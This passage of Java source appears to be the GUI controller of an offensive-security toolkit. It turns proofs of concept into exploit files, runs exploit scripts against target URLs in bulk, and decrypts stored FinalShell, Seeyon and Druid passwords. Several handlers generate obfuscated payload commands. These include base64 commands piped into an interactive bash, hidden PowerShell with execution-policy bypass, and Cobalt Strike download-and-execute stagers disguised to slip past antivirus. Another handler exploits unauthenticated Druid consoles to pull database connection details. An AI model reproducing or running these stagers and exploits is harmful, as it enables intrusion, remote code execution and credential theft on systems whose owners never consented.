                    String[] commands2 = deleteArrayNull(command2);
                    Process pro2 = Runtime.getRuntime().exec(commands2);
                }
            } catch (Exception e) {
                // TODO: handle exception
            }
        }

        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        if (jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")){ //判断是否为jar启动的
            jarFile= new JarFile(jarPath);
            JarEntry jarEntry = jarFile.getJarEntry("test.txt");
            request_header = Readfile.readFileByLines(jarEntry);
        }else if(os.toLowerCase().startsWith("win")){
            request_header = Readfile.readFileByLines("property/test.txt");
        }
        else{ // 非jar启动就直接从当前目录取test.txt
            System.out.println("无jar，所以调用readFileByLines的String方法");
            request_header = Readfile.readFileByLines("test.txt");
        }



//        for (String[] str: request_header)
//            for (String strr: str)
//                System.out.println(strr);


        Map<String, String> responseHeaderbody = listMakeRequest(request_header, ishttps,isallowredirects);
//        System.out.println( "******" + responseHeaderbody);

        for (String key : responseHeaderbody.keySet()) {
            try {

//                System.out.println(responseHeaderbody.get(key));
                String[] response = responseHeaderbody.get(key).split("ms\n");
                responsetime = response[0].split(":")[1].split("ms")[0];
                responseheaderbody = key.replace("null:", "").replace("[", "").replace("]", "") + '\n' + response[1];
//                System.out.println(responseheaderbody);

            } catch (ArrayIndexOutOfBoundsException e) { // 防止响应包为空，导致response数组越界
                responseheaderbody = key.replace("null:", "").replace("[", "").replace("]", "") + '\n';
            }
            //页面的响应时间回显
            mLabel2.setText(responsetime);

            //页面的响应包回显
            mTextArea2.setText(responseheaderbody);
        }
    }

    @FXML
    //根据响应包条件确认该请求是否满足按钮
    public void onButton2Click(ActionEvent event) {

        //获取响应包关键字条件
        String words = mTextField1.getText().trim();

        //获取响应时间条件
        String time = mTextField2.getText().trim();

        //获取响应包的body
        String responsebody = mTextArea2.getText().trim();

        //获取响应时间
        String responsetime = mLabel2.getText().trim();

        if (words.equals("")){
            if (responsetime.compareTo(time) >= 0) {
                mLabel4.setText("满足！可以进行生成exp操作！");
            } else {
                mLabel4.setText("不满足！请少侠再仔细判断是否满足条件！");
            }
        }else if(time.equals("")){
            if (responsebody.contains(words)) {
                mLabel4.setText("满足！可以进行生成exp操作！");
            } else {
                mLabel4.setText("不满足！请少侠再仔细判断是否满足条件！");
            }
        }else {
            if (time.compareTo(responsetime) >= 0 || responsebody.contains(words)) {
                mLabel4.setText("满足！可以进行生成exp操作！");
            } else {
                mLabel4.setText("不满足！请少侠再仔细判断是否满足条件！");
            }
        }
    }

    @FXML
    // 读取响应生成exp的yml文件按钮
    public void onButton3Click(ActionEvent event) throws IOException {
        JarFile jarFile;
        String[][] request_header;
        /*
        * GET
        http://www.baidu.com
        HTTP/1.1
        /
        a=1

        accept: 1
        user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
        token: 123
        Connection: keep-alive */

        // 获取expname exp的名字
        String expname = mTextField3.getText().trim();

        // 获取expname exp的描述
        String expdescribe = mTextArea3.getText().trim();

        //获取响应包关键字条件
        String words = mTextField1.getText().trim();

        //获取响应时间条件
        String time = mTextField2.getText().trim();

        // 获取yml的名字
        String ymlname = mTextField4.getText().trim();

        boolean isallowredirects = true;

        if (mRadiobutton1.isSelected())
            isallowredirects = false;

//        expdescribe = "'" + expdescribe + "'";

        // 获取请求头



//        String[][] request_header = Readfile.readFileByLines("property/test.txt");
        String os = System.getProperty("os.name");
        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        if (jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")){ //判断是否为jar启动的

            jarFile= new JarFile(jarPath);

            JarEntry jarEntry = jarFile.getJarEntry("test.txt");

            request_header = Readfile.readFileByLines(jarEntry);

        }else if (jarPath.contains(".jar") && os.toLowerCase().startsWith("win")){
            request_header = Readfile.readFileByLines("property/test.txt");
        }else{ // 非jar启动就直接从jar取test
            request_header = Readfile.readFileByLines("test.txt");
        }


        System.out.println(ymlname);

        boolean a =  Readfile.datatoymlFile(request_header,"poc/" + ymlname ,words,time,expname,expdescribe,isallowredirects);

        ObservableList<String> strList = dirnametlistview1("poc");


        if(os.toLowerCase().startsWith("win")) {
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        mListView1.setItems(strList);

    }

    @FXML
    // 漏洞利用按钮
    public void onButton4Click(ActionEvent event) throws FileNotFoundException {

//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.setProperty("https.proxyHost", ipportlist[2]);
//            System.setProperty("https.proxyPort", ipportlist[3]);
//            System.setProperty("http.proxyHost", ipportlist[2]);
//            System.setProperty("http.proxyPort", ipportlist[3]);
//            // http代理
//        }else{
//            System.setProperty("https.proxyHost", "");
//            System.setProperty("https.proxyPort", "");
//            System.setProperty("http.proxyHost", "");
//            System.setProperty("http.proxyPort", "");
//        }
//
//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.getProperties().put("socksProxySet","true");
//            System.getProperties().put("socksProxyHost",ipportlist[2]);
//            System.getProperties().put("socksProxyPort",ipportlist[3]);
//            // socks代理
//        }else{
//            System.getProperties().put("socksProxySet","false");
//            System.getProperties().put("socksProxyHost","");
//            System.getProperties().put("socksProxyPort","");
//        }
        proxy();

        //获取url
        String url = mTextField5.getText().trim();
//        //获取时间参数条件关键字
//        String times = mText3.getText().trim();

        //获取响应包条件关键字
        String words = mText4.getText().trim();
        String ishttps = "http";

        if (url.contains("https") )
                ishttps = "https";

        String[] poctoexplist ;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            poctoexplist = poctoexp(System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem(),url,ishttps);

        else
            poctoexplist = poctoexp("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem(),url,ishttps);

        //页面的响应时间回显
        mText5.setText(poctoexplist[0]);

        //页面的响应包回显
        mTextArea4.setText(poctoexplist[1]);

        if (words.equals("null")){
            mText6.setText("不存在相应的关键字回显\n(确认是否是关键字exp)");
        } else {
            if ( poctoexplist[1].contains(words)) {
                //页面的是否有响应关键字回显
                mText6.setText("存在相应的关键字回显");
            } else {
                mText6.setText("不存在相应的关键字回显\n(确认是否是关键字exp)");
            }
        }
    }

    @FXML
    // 弹出代理窗口
    public void onButton5Click(ActionEvent event) throws IOException {

    Stage stage=new Stage();
    Parent root = FXMLLoader.load(getClass().getResource("/proxy.fxml"));
    stage.setTitle("设置代理");
    stage.setScene(new Scene(root));
    stage.show();
    //将第二个窗口保存到map中
    StageManager.STAGE.put("second", stage);
    //将本窗口保存到map中
    StageManager.CONTROLLER.put("Poc2ExpguiController", this);

//    ProxyController second2=(ProxyController) StageManager.CONTROLLER.get("ProxyController");

//    String ipporthttp = second2.mTextField66.getText().trim();
//    System.out.println(ipporthttp);
//    if (ipporthttp.equals("")){
//        second2.mTextField66.setText("127.0.0.1:8080");
//    }else{
//        String index_ipport = mLabeltest.getText().trim();
//        String[] index_ipport_lists = index_ipport.split("ip:port为:");
//        second2.mTextField66.setText(index_ipport_lists[1]);
//    }

    }

    @FXML
    // 修改exp描述保存按钮
    public void onButton6Click(ActionEvent event) throws IOException {

        String filename = "poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem();

        String expname = mTextField6.getText();

        String expdescribe = mTextAreatest.getText();

        System.out.println( expname +'\n' + expdescribe);
        System.out.println(filename);

        modifyFileContent(filename,"expname", expname );
        modifyFileContent(filename,"expdescribe" ,expdescribe );
    }

    @FXML
    // 批量按钮
    public void onButton7Click(ActionEvent event) throws IOException {

//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.setProperty("https.proxyHost", ipportlist[2]);
//            System.setProperty("https.proxyPort", ipportlist[3]);
//            System.setProperty("http.proxyHost", ipportlist[2]);
//            System.setProperty("http.proxyPort", ipportlist[3]);
//            // http代理
//        }else{
//            System.setProperty("https.proxyHost", "");
//            System.setProperty("https.proxyPort", "");
//            System.setProperty("http.proxyHost", "");
//            System.setProperty("http.proxyPort", "");
//        }
//
//        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
//            String[] ipportlist = mLabeltest.getText().trim().split(":");
//            System.getProperties().put("socksProxySet","true");
//            System.getProperties().put("socksProxyHost",ipportlist[2]);
//            System.getProperties().put("socksProxyPort",ipportlist[3]);
//            // socks代理
//        }else{
//            System.getProperties().put("socksProxySet","false");
//            System.getProperties().put("socksProxyHost","");
//            System.getProperties().put("socksProxyPort","");
//        }
        // todo python模块的批量需要带入到参数里

        //获取url
        String url = mTextArea5.getText().trim();

//        String[] urllist = url.split("\n");
//        for (String str : urllist)
//            System.out.println(str);

//        //获取时间参数条件关键字
//        String times = mText3.getText().trim();
//
//        //获取响应包条件关键字
//        String words = mText4.getText().trim();
//
//        if (times.equals("null"))
//            times = "0";
//
//        if (words.equals("null"))
//            words = "";

        // 得到结果
//        List<String> vulurllist = poctoexp("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem(), urllist ,Integer.parseInt(times),words);
//
//        System.out.println(vulurllist);
//
//        for (String str:vulurllist)
//            total = total + str +'\n';

        poctoFile(url, "pythonexp/url.txt");
        String pythonscript = "pythonexp/poc2jarpiliang.py";
        String ymlFile = "poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() ;
        System.out.println(ymlFile);
        String pythonpath = mTextField82.getText().trim();
        String total = "";
        String[] command = new String[100];
        command[0] = pythonpath;
        command[1] = pythonscript;
        command[2] = ymlFile;

        String[] commands = deleteArrayNull(command);

        for (String s : commands)
            System.out.println(s);

        try {
            Process pro = Runtime.getRuntime().exec(commands);
            InputStream is1 = pro.getInputStream();
            InputStream is2 = pro.getErrorStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            BufferedReader buf2 = new BufferedReader(new InputStreamReader(is2));

            String line = null;
            while ((line = buf.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea5.setText(total.trim()); // 将python脚本输出结果回显
                System.out.println(line);
            }
            while ((line = buf2.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea5.setText(total.trim()); // 将python脚本输出结果回显
                System.out.println(line);
            }

        } catch (Exception e) {
            // TODO: handle exception
        }

    }


    @FXML
    // tasklist /svc按钮
    public void onButton8Click(ActionEvent event) throws IOException {

        //获取tasklist /svc的参数
        String tasklist = mTextArea6.getText().trim();

        Map<String,String> exelist = new HashMap<String, String>();

        String[] exetestlist = readFileByLines("property/exetest.txt");
        for (String str : exetestlist)
            if (str!=null) {
//                System.out.println( "exetestlist" + str);
                exelist.put(str.split(": ")[0], str.split(": ")[1]);
            }
        String[] resultlist2 = tasklist.split("\n"); // 将读取的进程通过换行分割成字符串组
        String[] resultlist22 ;

//        System.out.println(exelist);

        resultlist22 = taskexechange(resultlist2);

        String finallist = ifexe(resultlist22,exelist);

        mTextArea7.setText(finallist);


    }

    // python脚本模块，0.57开始调用pocsuite
    public void onButton9Click(ActionEvent actionEvent) {
        new Thread() { // 由于createmenuitem不能进行创建buildHttpMessage，所以另起一个线程进行探测
            public void run() {
                //String pythonpath ;
                String os = System.getProperty("os.name");
                String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径

                String pythonscript;
                if (!(mListView5.getSelectionModel().getSelectedItem() == null))
                    pythonscript = "pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + '/' + mListView5.getSelectionModel().getSelectedItem();
                else
                    pythonscript = "pythonexp/" + mListView4.getSelectionModel().getSelectedItem();

                String params = mTextField7.getText().trim();
                String total = "";
                //String[] paramlist = params.split(" ");
                String[] command = new String[100];
                if (mTextField83.getText().trim().contains(" ")) {
                    command[0] = mTextField83.getText().trim().split(" +")[0];
                    command[1] = mTextField83.getText().trim().split(" +")[1];
                    command[2] = "-r";
                    command[3] = pythonscript;

                    String vulnurl = mTextArea92.getText().trim();
                    if (!vulnurl.equals("")) {
                        poctoFile(vulnurl, "pythonexp/vuln.txt");
                        command[4] = "-f";
                        command[5] = "pythonexp/vuln.txt";
                    } else if (!params.equals("")) {
                        command[4] = "-u";
                        command[5] = params;
                    }
                }else{
                command[0] = mTextField83.getText().trim();
                command[1] = "-r";
                command[2] = pythonscript;

                String vulnurl = mTextArea92.getText().trim();
                if (!vulnurl.equals("")) {
                    poctoFile(vulnurl, "pythonexp/vuln.txt");
                    command[3] = "-f";
                    command[4] = "pythonexp/vuln.txt";
                } else if (!params.equals("")) {
                    command[3] = "-u";
                    command[4] = params;
                }
                }
                String[] commands = deleteArrayNull(command);


                for (String s : commands)
                    System.out.println(s);

                try {
                    Process pro = Runtime.getRuntime().exec(commands);
                    InputStream is1 = pro.getInputStream();
                    BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
                    InputStream is2 = pro.getErrorStream();
                    BufferedReader buf2 = new BufferedReader(new InputStreamReader(is2));
                    String line = null;
                    while ((line = buf.readLine()) != null) {
                        total = total + '\n' + line;
                        mTextArea9.setText(total); // 将python脚本输出结果回显
                        System.out.println(line);
                    }
                    while ((line = buf2.readLine()) != null) {
                        total = total + '\n' + line;
                        mTextArea9.setText(total); // 将python脚本输出结果回显
                        System.out.println(line);
                    }
//            if (mTextArea9.getText().equals("")){
//                mTextArea9.setText("目标可能无漏洞或者无法连通。");
//            }

                } catch (IOException e) {
                    total = total + e.toString();
                    mTextArea9.setText(total); // 将python脚本输出结果回显
                }
            }
        }.start();
    }

    // finalshell密码转换、seeyon数据库密码解密模块
    // druid 密码转换
    public void onButton10Click(ActionEvent actionEvent) throws Exception {
        String total = "";
        //获取待解密的明文
        String encode = mTextArea10.getText().trim();
        if (!encode.equals("")) {
            String[] encodes = encode.split("\n");
            for (String str : encodes)
                if (str != null) {
                    total = total + '\n' + str + "[decode]:" + decodePass(str);
                }
            mTextArea10.setText(total.trim());
        }

        String total2 = "";
        //获取待解密的明文
        String encode2 = mTextArea11.getText().trim();
        if (!encode2.equals("")) {
            String[] encodes2 = encode2.split("\n");
            for (String str : encodes2)
                if (str != null) {
                    String asciis = stringToAscii(jdkBas64Decode2(str));
                    total2 = total2 + '\n' + str + "[decode]:" + asciiToString(asciis);
                }
            mTextArea11.setText(total2.trim());
        }

        String total3 = "";
        //获取待解密的明文
        String encode3 = mTextArea12.getText().trim();
        if (!encode3.equals("")) {
            if (mRadiobutton2.isSelected()){ // 选中即为1.0.16版本之后的
                String[] encodes31 = encode3.split("\n");
                String publicKey = encodes31[0];
                String cipherText = encodes31[1];
                String decryptPassword = ConfigTools.decrypt(publicKey, cipherText);
                System.out.println("decryptPassword：" + decryptPassword);
                total3 = total3 + '\n' + encode3 + "[decode]:" + decryptPassword;
            }
            else {
                String[] encodes3 = encode3.split("\n");
                for (String str : encodes3)
                    if (str != null) {
                        total3 = total3 + '\n' + str + "[decode]:" + ConfigTools.decrypt(str);
                    }
            }
            mTextArea12.setText(total3.trim());
        }
    }

    // unicode转中文按钮
    public void onButton13Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(UnicodeDecode(mTextArea13content));
    }

    // 中文转unicode按钮
    public void onButton14Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(UnicodeEncode(mTextArea13content));
    }

    // URL编码按钮
    public void onButton15Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        String decode_text = "";

        // 为处理非url编码字符但是存在百分号的情况
        //mTextArea13content = mTextArea13content.replaceAll("%(?![0-9a-fA-F]{2})", "%25");

        //
        //try {
        decode_text = URLEncoder.encode(mTextArea13content, "utf-8");
        //}catch (Exception e){
        //
        //}
        mTextArea13.setText(decode_text);
    }

    // URL解码按钮
    public void onButton16Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        // 为处理非url编码字符但是存在百分号的情况
        mTextArea13content = mTextArea13content.replaceAll("%(?![0-9a-fA-F]{2})", "%25");
        mTextArea13.setText(UnicodeDecode(URLDecoder.decode(mTextArea13content,"utf-8")));


        
    }

    // Base64编码按钮
    public void onButton17Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        String base64encodedString = Base64.getEncoder().encodeToString(mTextArea13content.getBytes(StandardCharsets.UTF_8));
        mTextArea13.setText(base64encodedString);
    }

    // Base64解码按钮
    public void onButton18Click(ActionEvent actionEvent) throws IllegalArgumentException {
        String total = "";
        String mTextArea13content = mTextArea13.getText().trim();
        // 需要判断长度，否则遇到奇数会解码失败
        try {
            byte[] base64decodedBytes = Base64.getDecoder().decode(mTextArea13content);
            total = total + "原始字符串解码：\n" + UnicodeDecode(new String(base64decodedBytes, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try {
            byte[] base64decodedBytes0 = Base64.getDecoder().decode(mTextArea13content + "="); // 取第三位开始的
            total = total + "\n\n" + "末尾加了一个=：\n" + UnicodeDecode(new String(base64decodedBytes0, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try {
            byte[] base64decodedBytes1 = Base64.getDecoder().decode(mTextArea13content + "=="); // 取第三位开始的
            total = total + "\n\n" + "末尾加了两个=：\n" + UnicodeDecode(new String(base64decodedBytes1, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try {
            byte[] base64decodedBytes2 = Base64.getDecoder().decode(mTextArea13content.substring(2)); // 取第三位开始的
            total = total + "\n\n" + "取第三位开始：\n" + UnicodeDecode(new String(base64decodedBytes2, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try{
        byte[] base64decodedBytes3 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-64)); // 取后六十四位
        total = total + "\n\n" + "取后六十四位：\n" + UnicodeDecode(new String(base64decodedBytes3, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try{
        byte[] base64decodedBytes4 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-32)); // 取后三十二位
        total = total + "\n\n" + "取后三十二位：\n" + UnicodeDecode(new String(base64decodedBytes4, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        try{
            byte[] base64decodedBytes5 = Base64.getDecoder().decode(mTextArea13content.substring(mTextArea13content.length()-16)); // 取后三十二位
            total = total + "\n\n" + "取后十六位：\n" + UnicodeDecode(new String(base64decodedBytes5, StandardCharsets.UTF_8));
        }catch (Exception e){
            e.printStackTrace();
        }

        if (total.equals("")){
            total = total + mTextArea13content +  "解码错误";
        }
        mTextArea13.setText(total);
    }

    // Hex编码按钮
    public void onButton19Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(str2HexStr(mTextArea13content,"utf-8"));
    }

    // Hex解码按钮
    public void onButton20Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(hexStr2Str(mTextArea13content,"utf-8"));
    }

    // Hex编码按钮
    public void onButton21Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(HtmlEncode(mTextArea13content));
    }

    // Hex解码按钮
    public void onButton22Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(HtmlDecode(mTextArea13content));
    }


    // ascii编码按钮
    public void onButton23Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        mTextArea13.setText(AsciiEncode(mTextArea13content));
    }

    // ascii解码按钮
    public void onButton24Click(ActionEvent actionEvent) throws Exception {
        String mTextArea13content = mTextArea13.getText().trim();
        String[] t = mTextArea13content.split(" ");
        String total = "";
        for (String ts:t)
            total = total + byteAsciiToChar(Integer.parseInt(ts));
        mTextArea13.setText(total.trim());
    }

    public void mRadiobutton3Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "bash -c {echo," + base64encodedString + "}|{base64,-d}|{bash,-i}\n\n或者\n\n" + "echo, " + base64encodedString + "| base64 -d|bash -i" ;
        mTextArea15.setText(outputString);
    }

    public void mRadiobutton4Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        byte[] sb2 = inputString.getBytes();
        int i = 0;
        byte[] bt3 = new byte[sb2.length+sb2.length];
        for (byte btest:sb2) {
            bt3[i++] = btest;
            bt3[i++] = (byte)0x00;
        }
        String str= new String (bt3);
        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + base64encodedString ;

        mTextArea15.setText(outputString);

    }

    public void mRadiobutton5Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "python -c exec('" + base64encodedString + "'.decode('base64'))";
        mTextArea15.setText(outputString);

    }

    public void mRadiobutton6Click(ActionEvent actionEvent) throws Exception {
        String inputString = mTextArea14.getText().trim();
        String outputString = "";
        String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
        outputString = outputString + "perl -MMIME::Base64 -e eval(decode_base64('" + base64encodedString + "'))";
        mTextArea15.setText(outputString);

    }

    // cs命令输入cs payload地址进行自动输出上线命令
    public void csEncode1(KeyEvent event) throws IOException {
        String inputString = mTextField9.getText().trim();
        String outputString1 = "";
        String outputString2 = "";
        String outputString3 = "";
        String outputString4 = "";

        outputString1 = "powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('" + inputString.substring(0,2) +"'+'" + inputString.substring(2) + "'))\"";
        mTextArea16.setText(outputString1); // 第一个框

        String strtest = "IEX (New-Object System.Net.Webclient).DownloadString('" + inputString + "')";

        byte[] sb2 = strtest.getBytes();
        int i = 0;
        byte[] bt3 = new byte[sb2.length+sb2.length];
        for (byte btest:sb2) {
            bt3[i++] = btest;
            bt3[i++] = (byte)0x00;
        }
        String str= new String (bt3);
        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
        mTextArea17.setText("powershell -enc " + base64encodedString); // 第二个框


        outputString2 = "powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('" +  inputString + "')";
        mTextArea18.setText(outputString2); // 第三个框

        outputString3 = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''" +  inputString + "''))';$a3=$a1,$a2;kaspersky(-join $a3)\"";
        mTextArea19.setText(outputString3); // 第四个框

        outputString4 = "powershell -NoExit $c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''" +  inputString + "'')'.Replace('123','adString');IEX ($c1+$c2)";
        mTextArea20.setText(outputString4); // 第五个框


    }





    @FXML
    // 命令模块
    // mTextArea14 输入命令自动出相应命令
    public void shellEncode(KeyEvent event) throws FileNotFoundException {
        String inputString = mTextArea14.getText().trim();
        if(inputString.trim() == ""){
            mTextArea15.setText("");
        }else {
            String outputString = "";
            if (mRadiobutton3.isSelected()) { // 选中Bash
                String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
                outputString = outputString + "bash -c {echo," + base64encodedString + "}|{base64,-d}|{bash,-i}\n\n或者\n\n" + "echo, " + base64encodedString + "| base64 -d|bash -i";

            } else if (mRadiobutton4.isSelected()) { // 选中Powershell
                byte[] sb2 = inputString.getBytes();
                int i = 0;
                byte[] bt3 = new byte[sb2.length + sb2.length];
                for (byte btest : sb2) {
                    bt3[i++] = btest;
                    bt3[i++] = (byte) 0x00;
                }
                String str = new String(bt3);
                String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
                outputString = outputString + "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + base64encodedString;

            } else if (mRadiobutton5.isSelected()) { // 选中Python
                String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
                outputString = outputString + "python -c exec('" + base64encodedString + "'.decode('base64'))";

            } else if (mRadiobutton6.isSelected()) { // 选中Perl
                String base64encodedString = Base64.getEncoder().encodeToString(inputString.getBytes(StandardCharsets.UTF_8));
                outputString = outputString + "perl -MMIME::Base64 -e eval(decode_base64('" + base64encodedString + "'))";
            }
            mTextArea15.setText(outputString);
        }
    }


    // 单个目标批量exp利用按钮
    public void onButton11Click(ActionEvent actionEvent) throws Exception {
        //获取url
        String url = mTextField51.getText().trim();
        String pythonscript = "pythonexp/poc2jarpiliangyml.py";
        String pythonpath = mTextField82.getText().trim();
        String exppath;
        //try {
        exppath = mListView1.getSelectionModel().getSelectedItem();
        //}catch (Exception e){
        //    exppath = "/";
        //}
        String isproxy = "0";
        String host = "127.0.0.1";
        String port = "8080";
        if (exppath == null)
            exppath = "/";
        else if (!exppath.contains("/"))
            exppath = "/" + exppath;

            String[] ipportlist = mLabeltest.getText().trim().split(":");

            if (ipportlist.length > 1) {
                isproxy = "1";
                host = ipportlist[2];
                port = ipportlist[3];
            }


        String total = "";
        String[] command = new String[100];
        command[0] = pythonpath;
        command[1] = pythonscript;
        command[2] = "-u";
        command[3] = url;
        command[4] = "-r";
        command[5] =  exppath;
        command[6] = "-x";
        command[7] =  isproxy;
        command[8] = "-h";
        command[9] =  host;
        command[10] = "-p";
        command[11] =  port;

        String[] commands = deleteArrayNull(command);

        for (String s : commands)
            System.out.println(s);

        try {
            Process pro = Runtime.getRuntime().exec(commands);
            InputStream is1 = pro.getInputStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            String line = null;
            while ((line = buf.readLine()) != null) {
                total = total + '\n' + line;
                mTextArea5.setText(total.trim()); // 将python脚本输出结果回显
                System.out.println(line);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    // 保存CS payload路径
    public void onButton25Click(ActionEvent actionEvent) throws IOException {
        String inputString = mTextField9.getText().trim();
        String python2path = mTextField8.getText().trim(); // python2 路径
        String python3path = mTextField82.getText().trim(); // python3 路径
        String pocsuitepath = mTextField83.getText().trim(); // pocsuite 路径

        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径

        String os = System.getProperty("os.name");


        if (!jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")) {

            System.out.println("无jar，不修改");

        }else if(os.toLowerCase().startsWith("win")){
            String target = "python2path=" + python2path + '\n' + "python3path=" + python3path + '\n' + "cspayload=" + inputString +  '\n' + "pocsuite=" + pocsuitepath ;
            poctoFile(target, "property/config.properties");

        }else{
            Properties prop = new Properties();
            prop.load(Main.class.getResourceAsStream("/config.properties"));  // 读取源文件

            prop.setProperty("python2path", python2path);
            prop.setProperty("python3path", python3path);
            prop.setProperty("cspayload", inputString);
            prop.setProperty("pocsuite", pocsuitepath);
            String tempPath = jarPath.substring(0, jarPath.lastIndexOf("/")) + "/config.properties";

            System.out.println(tempPath);
            Writer w = new FileWriter(tempPath);
            prop.store(w, "python run path");
            w.close();
            String[] command = new String[100];
            command[0] = "jar";
            command[1] = "uf";
            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
            command[3] = "config.properties";
            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties 替换jar里面的config.properties文件

            String[] commands = deleteArrayNull(command);
            for (String s : commands)
                System.out.println(s);

            try {
                Process pro = Runtime.getRuntime().exec(commands);
                String[] command2 = new String[100];
                Robot r = new Robot();
                r.delay(500);
                command2[0] = "rm";
                command2[1] = tempPath;
                String[] commands2 = deleteArrayNull(command2);
                Process pro2 = Runtime.getRuntime().exec(commands2);

            } catch (Exception e) {
                // TODO: handle exception
            }
        }
    }

    // druid未授权漏洞利用
    public void onButton26Click(ActionEvent actionEvent) throws Exception {
        proxy();
        String druidVulnUrl = mTextField10.getText().trim(); // druid漏洞地址
        String[] JdbcUsername  = getJdbcUsername(druidVulnUrl);
        mTextField11.setText(JdbcUsername[0]);  // jdbc链接
        mTextField12.setText(JdbcUsername[1]);  // 数据库用户名

        String[] sqlList = getSql(druidVulnUrl);
        String sql = "";
        for(int i=0;i<sqlList.length;i++)
            sql = sql  + sqlList[i] + "\n\n";
        mTextArea21.setText(sql); // sql语句

        String[][] lists = getUri(druidVulnUrl);
        String uriLists = "";
        for(int i = 0;i<lists.length-1;i++)
            for(int j = i+1;j<lists.length-1;j++)
                if (lists[i][0] != null && lists[j][0] != null ) {
                    if ( Integer.parseInt(lists[i][2]) < Integer.parseInt(lists[j][2])){
                        String[][] mid = new String[1][3];
                        mid[0][0] = lists[i][0];
                        mid[0][1] = lists[i][1];
                        mid[0][2] = lists[i][2];
                        lists[i][0] = lists[j][0];
                        lists[i][1] = lists[j][1];
                        lists[i][2] = lists[j][2];
                        lists[j][0] = mid[0][0];
                        lists[j][1] = mid[0][1];
